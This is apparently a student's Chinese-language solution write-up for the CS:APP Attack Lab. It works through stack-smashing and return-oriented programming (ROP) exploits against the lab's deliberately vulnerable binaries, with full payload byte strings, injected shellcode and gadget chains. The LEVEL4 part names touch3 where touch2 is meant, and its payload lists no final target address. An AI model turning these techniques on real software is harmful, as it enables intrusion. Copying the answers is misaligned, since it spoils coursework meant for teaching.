* LEVEL1
  * PREQUEST
    1. 本关不需要注入任何新的代码，我们只用保证程序能执行到指定的为止即可
    2. 检查 <test> 函数其语义可大致使用以下代码表示(并不属于完整片段):

       void test() {
         int val;
         val = getbuf();
         printf("No exploit.  Getbuf returned 0x%x\n", val);
       }
        
      本关要求，在 getbuf 返回前能够执行到 <touch1> 函数，而不是打印接下来的 printf
  * SOLVE
    1. see [./ctarget_dump_d] 可知 <touch1> 函数所在地址为 0x4017c0
    2. 既然要求在返 <getbuf> 不能返回原先所在的语义，那么就要求，所输入的字符串需要造成 [buffer overflow] 导致 call 所保存的上一个
    栈帧中的返回地址被破坏，从而使 <getbuf> 执行 ret 指令时会跳转到我们目标的攻击函数中
    3. 查看 <getbuf> 函数逆向实现可知(0x4017a8)，编译期为当前栈帧分配了 0x28 字节，并且这 0x28 字节都为 <Gets> 目标缓冲区所使用，得
    出结论: 我们的攻击字符串需要先向上滑动 0x28 字节，然后再填入目标地址，即: 

      00 00 00 00 00 00 00 00 
      00 00 00 00 00 00 00 00 
      00 00 00 00 00 00 00 00 
      00 00 00 00 00 00 00 00 
      00 00 00 00 00 00 00 00
      c0 17 40 00 00 00 00 00

    4. 这里我们要注意下大小端字节序的问题，see: c0 17 40 00 00 00 00 00
    5. 查看结果: 
      unix> ./hex2rax < exploit.txt > exploit.out
      gdb> r -q < expolit.out


* LEVEL2
  * PREQUEST
    1. 不要使用任何 jmp 或者 call 指令，因为指令要求的目的地址是很难指定的，在这里我们使用 ret 指
    令来代替任意传输的控制的请求
    2. 查看 ./attacklab.pdf/Appendix B 部分去学习如何生成指令的二进制表示以方便接下来的工作

  * SOLVE:
    1. 本关和 LEVE1 一致，要求指令 <getbuf> 函数返回 test 语义前能够跳转至 <touch2>，并且在 <touch2> 中
    需要正确打印出 Touch2!: You called touch2 的实现
    2. 查看 <touch2> 函数上下文，发现打印出上述要求需要寄存器 edi 和 ../cookie.txt 中所保存的值相等才可
    以，但是在 <touch2> 上一个栈帧中(假定为 <getbuf>) 并无显著修改该寄存器的指令，故在这里，需要我们自己
    注意一部分代码以实现这一要求
    3. 由于 ctarget 的特殊性，使得栈上的代码都为可执行代码，并且，栈的地址都为强制性分配，即不会出现随机
    地址的情景，故利用这一特性，我们可以在通过缓冲区溢出的时机在栈上注入部分我们的代码，并且在第一次 ret
    时，能够跳转到栈上的这部分可执行指令中，它对应的编码为:

      68 ec 17 40 00 bf fa 97 
      b9 59 c3 00 00 00 00 00
      00 00 00 00 00 00 00 00 
      00 00 00 00 00 00 00 00 
      00 00 00 00 00 00 00 00
      78 dc 61 55 00 00 00 00

    观察最后一段编码: 0x5561dc78，其实它就是第一次 ret 需要跳转到的地址，其实也就对应着第一段编码，第一段
    编码可以翻译为:

      68 ec 17 40 00 bf fa 97 b9 59 c3

    它具体对应的指令为:

      0:   68 ec 17 40 00          pushq  $0x4017ec
      5:   bf fa 97 b9 59          mov    $0x59b997fa,%edi
      a:   c3                      retq

    我们可以看到，该指令在栈上压入了 <touch2> 的目标地址，并设置了 %edi 寄存器为 ../cookie.txt 中所保存的值，
    最后再通过 ret 指令以读取当前 rsp 指针中所保存的元素并跳转至此处，以完成 <touch2> 的攻击
    


* LEVEL3
  * PREQUEST:
    1. <heaxmatch>: 

      int hexmatch(unsigned val, char *sval) {
        char cbuf[110];

        /* Make position of check string unpredictable */
        char*s = cbuf + random() % 100;
        sprintf(s, "%.8x", val);
        return strncmp(sval, s, 9) == 0;
      }

    2. <touch3>:
      
      void touch3(char*sval) {
        vlevel = 3;       

        /* Part of validation protocol */
        if (hexmatch(cookie, sval)) {
          printf("Touch3!: You called touch3(\"%s\")\n", sval);
          validate(3);
        } else {
          printf("Misfire: You called touch3(\"%s\")\n", sval);
          fail(3);
        }

        exit(0);
      }

  * SOLVE:
    1. 跳转要求和前面一致，不在阐述
    2. <heaxmatch> 返回正确结果的前提是 sval 设置为和 cookie 等额 ASCII 表示数值的字符串(不带有前缀 0x)
    3. 可通过 [./ctarget_dump_d] 可知，<heaxmatch> 的参数 sval 通过寄存器 %rdi 传输，故我们可以暂且明确
    一个目标，要将 %rdi 设置为指向和 cookie 等额 ASCII 表示数值的字符串指针
    4. 通过 gdb 调试时会发现，<heaxmatch> 会破坏掉原先由 <getbuf> 中所构造的缓冲区，故我们的字符串所指向
    的地址不能在这个范围之内，由此得出: 

      68 fa 18 40 00 48 c7 c7 
      a8 dc 61 55 c3 00 00 00
      00 00 00 00 00 00 00 00 
      00 00 00 00 00 00 00 00 
      00 00 00 00 00 00 00 00
      78 dc 61 55 00 00 00 00
      35 39 62 39 39 37 66 61  <-- "59b997fa"; 将字符串放在这个位置是为了防止 <heaxmatch> 对其进行破坏
      00 00 00 00 00 00 00 00

    其中，前两段的代码主要作用就是设置 %rdi 指向上述地址，并且设置 ret 返回为 <touch3>，这个思想和 LEVEL2
    一致



* LEVEL4
  * PREQUEST:
    1. 本关和 LEVEL2 的要求一致
    2. 仅能使用 %rax - %rdi 的寄存器
    3. 仅能使用 movq popq ret nop 指令去构造我们的 gadget
    4. 本次攻击仅能使用两种 gadget
  
  * SOLVE:
    1. 本关的跳转目的和 LEVEL2 保持一致，但是在 rtaget 的基础上，栈被设置了现代操作系统所提供的防溢出机制.
    2. 因为要根据已有代码的基础上封装自己的 gadget，所以实际执行指令有限，根据 attacklab.pdf/Figure_3_A_B 
    和 gadget farm 中的代码可得，可得出以下指令

     gadget_1:
      pop %rax
      nop
      retq

     gadget_2:
      movq %rax, %rdi
      retq

    我们先将 gadget_1 的首地址写入栈中，覆盖至 getbuf 存储用于返回上一个栈帧的区域，那么当 getbuf 返回时，首先执
    行 gadget_1.
    gadget_1 执行时会在栈中继续弹出数据并赋值给 rax，故我们还要保证一个写入的数据区的下一个韦志中包含有 $rax 所需
    要的数据，在这里，这个数据即为 cookie 的值.

      00 00 00 00 00 00 00 00 
      00 00 00 00 00 00 00 00 
      00 00 00 00 00 00 00 00 
      00 00 00 00 00 00 00 00 
      00 00 00 00 00 00 00 00 
      cc 19 40 00 00 00 00 00 /* pop %rax; nop; retq */
      fa 97 b9 59 00 00 00 00 /* cookie data */
    
    当 gadgets 在栈中构造好后，一旦一个 gadget 被执行，那么就会发起一个 gadget 执行链，下一个 gadget 的执行依赖于上一个
    gadget 的 ret 返回，那么在内存的下一段区域，我们还要继续写入 gadget_2 的地址.
    在 gadget_2 的工作能够依据 %rax 初始化完 %rdi，故当其执行完毕后，我们下一段跳转的地址则为 attack function 的地址了，
    即 <touch3> 的地址.

      00 00 00 00 00 00 00 00 
      00 00 00 00 00 00 00 00 
      00 00 00 00 00 00 00 00 
      00 00 00 00 00 00 00 00 
      00 00 00 00 00 00 00 00 
      cc 19 40 00 00 00 00 00 /* pop %rax; nop; retq */
      fa 97 b9 59 00 00 00 00 /* cookie data */
      a2 19 40 00 00 00 00 00 /* movq %rax, %rdi; retq */
      


* LEVEL5
  * PREQUEST:
    1. 本关和 LEVEL3 的要求一致.
    2. 本关对于指令和寄存器的使用并无限制，因为 ./attacklab.pdf 中并无显著提及这一要求.

  * SOLVE:
    1. 由于本关卡和 LEVEL3 保持一致，故要求和有效的解决点提示直接参照 LEVEL3 即可.

    2. 解决本题的关键是得到一个指令:
      
      lea (%rdi,%rsi,1), %rax
    
    显然，这是一段内存偏移指令，并且假设我们唯一能够获取到内存地址的方式是依赖于 %rsp 寄存器，那么该指令就是
    要基于 rsp 形成偏移.

    并且，该题在 LEVEL3 中也提及，字符串存储在 rdi 中，故该指令成为关键，并且也能够在 gadget farm 中封装出一
    个 gadget.

    要吐槽一下的是，这题在 writeup 中提及并不建议我们做，那么你至少认真点书写好说明给想做的人哇，第一没有提及
    是否允许使用其它指令格式，第二，在海量组合中寻找出 lea (%rdi,%rsi,1), %rax 我发现是一件浪费时间的事情，又
    要自己编译，又要在 gadget farm 中寻找有没有，你至少把这种指令的组合格式以表格的形式给出来吧，真坑死人.

    2. 首先查看解题的数据

      1. 00 00 00 00 00 00 00 00
      2. 00 00 00 00 00 00 00 00
      3. 00 00 00 00 00 00 00 00
      4. 00 00 00 00 00 00 00 00
      5. 00 00 00 00 00 00 00 00
      6. 06 1a 40 00 00 00 00 00    # movq %rsp, %rax
      7. c5 19 40 00 00 00 00 00    # movq %rax, %rdi

      8. ab 19 40 00 00 00 00 00    # popq %rax
      9. 48 00 00 00 00 00 00 00    # 0x48 data
     10. dd 19 40 00 00 00 00 00    # movl %eax, %edx
     11. 34 1a 40 00 00 00 00 00    # movl %edx, %ecx
     12. 13 1a 40 00 00 00 00 00    # movl %ecx, %esi

     13. d6 19 40 00 00 00 00 00    # lea (%rdi, %rsi, 1), %rax

     14. c5 19 40 00 00 00 00 00    # movq %rax, %rdi
     15. fa 18 40 00 00 00 00 00    # touch3 

     16. 35 39 62 39 39 37 66 61    # cookie string
     17. 00 00 00 00 00 00 00 00    # '\0'

    第 6 7 行暂存了 rsp 所处地址给 rdi，由于 <getbuf> 执行 ret 造成栈指针偏移的缘故，此时 rsp 所指向的地址为第 7 行.

    我们可以看到，目前数据的组织结构使得 rsp 目前所处位置(第 7 行) + 0x48 后刚好能够指向字符串所处位置，故目前我们的工
    作就是使得 rsi = 0x48

    但是，目前的 gadget farm 中并无法封装出 popq %rsi 的指令，故我们需要换种方式，在这里，第 8 ~ 12 行都是由于在 gadget
    farm 中无法封装出更简洁的 gadget 才书写的指令，主要工作就是为了让 %rsi = 0x48.

    13 14 行执行完毕后，此时 rdi 刚好指向 cookie string 所在位置，即 14 行执行完 ret 后我们就需要跳转到 <touch3> 开始攻击
    了，那么，在 14 行下一块区域就要放置 ret 即将要跳转的位置，即 <touch3> 的内存地址.
